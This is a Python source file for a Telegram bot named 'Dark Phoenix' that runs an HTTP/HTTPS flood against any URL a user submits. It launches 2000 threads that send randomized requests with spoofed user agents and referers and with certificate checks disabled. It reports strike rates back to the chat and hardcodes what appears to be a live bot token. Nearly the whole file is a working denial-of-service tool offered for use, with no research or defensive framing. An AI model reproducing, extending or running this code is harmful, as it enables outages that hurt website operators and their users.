import os
import sys
import socket
import threading
import random
import ssl
import asyncio
from urllib.parse import urlparse
import time

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    ContextTypes,
    filters,
    CallbackQueryHandler
)

Thetokken = "7693379915:AAGfj7plOq_1uH6pij0BmB1ys-AKPx-hj-Y"
attacks = {}  # Global dictionary to track active attacks

class DarkPhoenix:
    def __init__(self, target_url, num_threads=2000, chat_id=None):
        self.target = self._validate_target(target_url)
        self.num_threads = num_threads
        self.user_agents = self._load_user_agents()
        self.is_running = True
        self.chat_id = chat_id
        self.thread_pool = []
        self.ip = self._resolve_ip()
        self.port = self.target[1]
        self.protocol = "HTTPS" if self.port == 443 else "HTTP"
        self.website = self.target[0]
        self.strike_count = 0
        self.lock = threading.Lock()
        self.referers = self._load_referers()
        self.start_time = time.time()

    def _resolve_ip(self):
        try:
            return socket.gethostbyname(self.target[0])
        except socket.gaierror:
            return "Unknown"

    def _validate_target(self, url):
        parsed = urlparse(url)
        if not parsed.scheme:
            url = 'http://' + url
        parsed = urlparse(url)
        return (parsed.hostname, parsed.port or (443 if parsed.scheme == 'https' else 80))

    def _load_user_agents(self):
        templates = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_{}_{}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Safari/537.36",
            "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{}.0.{}.{} Mobile Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 15_{}_like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 15_{}_like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Mobile/15E148 Safari/604.1"
        ]
        agents = []
        for _ in range(250):
            template = random.choice(templates)
            if template.count("{}") == 3:
                major = random.randint(80, 115)
                build1 = random.randint(0, 9999)
                build2 = random.randint(0, 999)
                agents.append(template.format(major, build1, build2))
            elif template.count("{}") == 4:
                os1 = random.randint(10, 15)
                os2 = random.randint(0, 10)
                major = random.randint(80, 115)
                build1 = random.randint(0, 9999)
                build2 = random.randint(0, 999)
                agents.append(template.format(os1, os2, major, build1, build2))
            elif template.count("{}") == 2:
                ver = random.randint(0, 5)
                agents.append(template.format(ver, ver))
            else:
                agents.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36")
        return agents

    def _load_referers(self):
        return [
            "https://www.google.com/", "https://www.facebook.com/", "https://www.youtube.com/",
            "https://www.yahoo.com/", "https://www.bing.com/", "https://www.amazon.com/",
            "https://www.reddit.com/", "https://www.instagram.com/", "https://www.linkedin.com/",
            "https://www.pinterest.com/", "https://www.tumblr.com/", "https://www.flickr.com/",
            "https://www.quora.com/", "https://www.imdb.com/", "https://www.netflix.com/",
            "https://www.microsoft.com/", "https://www.apple.com/", "https://www.adobe.com/",
            "https://www.wordpress.org/", "https://www.github.com/"
        ]

    def _create_ssl_context(self):
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context

    def _generate_payload(self):
        method = random.choice(['GET', 'POST', 'HEAD', 'PUT', 'DELETE'])
        path = '/' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=random.randint(5, 25)))
        headers = [
            f"Host: {self.target[0]}",
            f"User-Agent: {random.choice(self.user_agents)}",
            "Accept: */*",
            f"Accept-Language: {random.choice(['en-US,en;q=0.9', 'fr-FR,fr;q=0.8', 'es-ES,es;q=0.7'])}",
            "Connection: keep-alive",
            f"Referer: {random.choice(self.referers)}"
        ]
        if method in ['POST', 'PUT']:
            headers.extend([
                "Content-Type: application/x-www-form-urlencoded",
                f"Content-Length: {random.randint(1024, 4096)}"
            ])
        other_headers = [
            "Upgrade-Insecure-Requests: 1",
            "Cache-Control: no-cache",
            "Pragma: no-cache",
            "DNT: 1",
            "Accept-Encoding: gzip, deflate, br"
        ]
        headers.extend(random.sample(other_headers, random.randint(0, 3)))
        random.shuffle(headers)
        headers_str = "\r\n".join(headers)
        return f"{method} {path} HTTP/1.1\r\n{headers_str}\r\n\r\n".encode()

    def _phoenix_strike(self, context):
        while self.is_running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                
                if self.target[1] == 443:
                    wrapped = self._create_ssl_context().wrap_socket(sock, server_hostname=self.target[0])
                    wrapped.connect((self.target[0], self.target[1]))
                    for _ in range(random.randint(5, 15)):
                        if not self.is_running:
                            break
                        try:
                            payload = self._generate_payload()
                            wrapped.sendall(payload)
                            with self.lock:
                                self.strike_count += 1
                                current = self.strike_count
                            if current % 100 == 0:
                                elapsed = time.time() - self.start_time
                                rate = int(current / elapsed) if elapsed > 0 else 0
                                asyncio.run_coroutine_threadsafe(
                                    context.bot.send_message(
                                        self.chat_id, 
                                        f"🔥 PHOENIX STRIKE #{current}\n"
                                        f"⚡ RATE: {rate}/sec\n"
                                        f"🎯 TARGET: {self.website}\n"
                                        f"🌐 IP: {self.ip}:{self.port}"
                                    ),
                                    app.loop
                                )
                        except Exception:
                            break
                    wrapped.shutdown(socket.SHUT_RDWR)
                else:
                    sock.connect((self.target[0], self.target[1]))
                    for _ in range(random.randint(5, 15)):
                        if not self.is_running:
                            break
                        try:
                            payload = self._generate_payload()
                            sock.sendall(payload)
                            with self.lock:
                                self.strike_count += 1
                                current = self.strike_count
                            if current % 100 == 0:
                                elapsed = time.time() - self.start_time
                                rate = int(current / elapsed) if elapsed > 0 else 0
                                asyncio.run_coroutine_threadsafe(
                                    context.bot.send_message(
                                        self.chat_id, 
                                        f"🔥 PHOENIX STRIKE #{current}\n"
                                        f"⚡ RATE: {rate}/sec\n"
                                        f"🎯 TARGET: {self.website}\n"
                                        f"🌐 IP: {self.ip}:{self.port}"
                                    ),
                                    app.loop
                                )
                        except Exception:
                            break
                    sock.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            finally:
                try:
                    sock.close()
                except:
                    pass

    def unleash_chaos(self, context):
        self.thread_pool = [threading.Thread(target=self._phoenix_strike, args=(context,), daemon=True) 
                            for _ in range(self.num_threads)]
        for thread in self.thread_pool:
            thread.start()

    def stop_chaos(self):
        self.is_running = False
        for thread in self.thread_pool:
            if thread.is_alive():
                thread.join(1.0)

# Telegram Bot Functions
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("⚔️ LAUNCH ATTACK", callback_data='start_attack')],
        [InlineKeyboardButton("🛑 STOP ATTACK", callback_data='stop_attack')],
        [InlineKeyboardButton("📊 ATTACK STATUS", callback_data='attack_status')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 DARK PHOENIX ACTIVATED 🔥\n\n"
        "Enter target URL to initiate:\n"
        "Example: http://target-domain.com\n\n"
        "⚡ 2000 THREADS | 🚀 MULTI-VECTOR | ☠️ DESTRUCTIVE",
        reply_markup=reply_markup
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data['target'] = update.message.text
    keyboard = [
        [InlineKeyboardButton("⚔️ LAUNCH ATTACK", callback_data='start_attack'),
         InlineKeyboardButton("🛑 STOP ATTACK", callback_data='stop_attack')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        f"🎯 TARGET ACQUIRED: {update.message.text}\n"
        "Press LAUNCH to unleash chaos",
        reply_markup=reply_markup
    )

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    chat_id = query.message.chat_id

    if query.data == 'start_attack':
        if 'target' not in context.user_data:
            await query.answer("❌ Target not set!")
            return

        if user_id in attacks:
            await query.answer("⚠️ Attack already running!")
            return

        target = context.user_data['target']
        phoenix = DarkPhoenix(target, chat_id=chat_id)
        attacks[user_id] = phoenix

        await context.bot.send_message(
            chat_id,
            f"☠️ PHOENIX ACTIVATED ☠️\n\n"
            f"🌐 TARGET: {target}\n"
            f"🔒 IP: {phoenix.ip}\n"
            f"🚪 PORT: {phoenix.port}\n"
            f"📡 PROTOCOL: {phoenix.protocol}\n"
            f"🧵 THREADS: {phoenix.num_threads}\n\n"
            "⚡ CHAOS ENGAGED ⚡"
        )
        
        threading.Thread(target=phoenix.unleash_chaos, args=(context,)).start()
        await query.answer("🔥 FIREPOWER DEPLOYED!")

    elif query.data == 'stop_attack':
        if user_id not in attacks:
            await query.answer("⚠️ No active attacks!")
            return

        attacks[user_id].stop_chaos()
        strike_count = attacks[user_id].strike_count
        elapsed = time.time() - attacks[user_id].start_time
        rate = int(strike_count / elapsed) if elapsed > 0 else 0
        del attacks[user_id]
        
        await query.answer("🛑 ATTACK TERMINATED")
        await context.bot.send_message(
            chat_id, 
            f"🔥 PHOENIX RETREAT 🔥\n"
            f"💥 TOTAL STRIKES: {strike_count}\n"
            f"⚡ AVG RATE: {rate}/sec\n"
            "Attack sequence halted"
        )
    
    elif query.data == 'attack_status':
        if user_id not in attacks:
            await query.answer("⚠️ No active attacks!")
            return
            
        phoenix = attacks[user_id]
        elapsed = time.time() - phoenix.start_time
        rate = int(phoenix.strike_count / elapsed) if elapsed > 0 else 0
        await context.bot.send_message(
            chat_id,
            f"📊 PHOENIX STATUS 📊\n\n"
            f"🎯 TARGET: {phoenix.website}\n"
            f"🌐 IP: {phoenix.ip}:{phoenix.port}\n"
            f"💥 STRIKES: {phoenix.strike_count}\n"
            f"⚡ RATE: {rate}/sec\n"
            f"⏱ UPTIME: {int(elapsed)} seconds"
        )
        await query.answer("Status updated")

async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f"ERROR: {context.error}")

if __name__ == '__main__':
    app = ApplicationBuilder().token(Thetokken).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_error_handler(error_handler)
    print("DARK PHOENIX OPERATIONAL")
    app.run_polling()
